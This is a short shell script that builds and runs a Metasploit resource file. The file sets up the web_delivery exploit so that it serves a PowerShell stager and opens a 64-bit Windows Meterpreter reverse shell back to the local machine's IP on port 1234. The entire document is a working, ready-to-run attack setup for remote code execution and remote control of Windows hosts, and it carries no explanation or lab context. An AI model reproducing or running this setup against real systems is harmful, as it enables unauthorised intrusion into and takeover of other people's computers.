ip=`ifconfig | grep -Eo 'inet (addr:)?([0-9]*\.){3}[0-9]*' | grep -Eo '([0-9]*\.){3}[0-9]*' | grep -v '127.0.0.1'`
tee msf_web_powershell_rev_x64.rc <<-EOF
use exploit/multi/script/web_delivery
# show targets # PSH 2
set target 2
set payload windows/x64/meterpreter/reverse_tcp
set lport 1234
set lhost  $ip
set srvhost 0.0.0.0
set srvport 8080
run
EOF
msfconsole -r msf_web_powershell_rev_x64.rc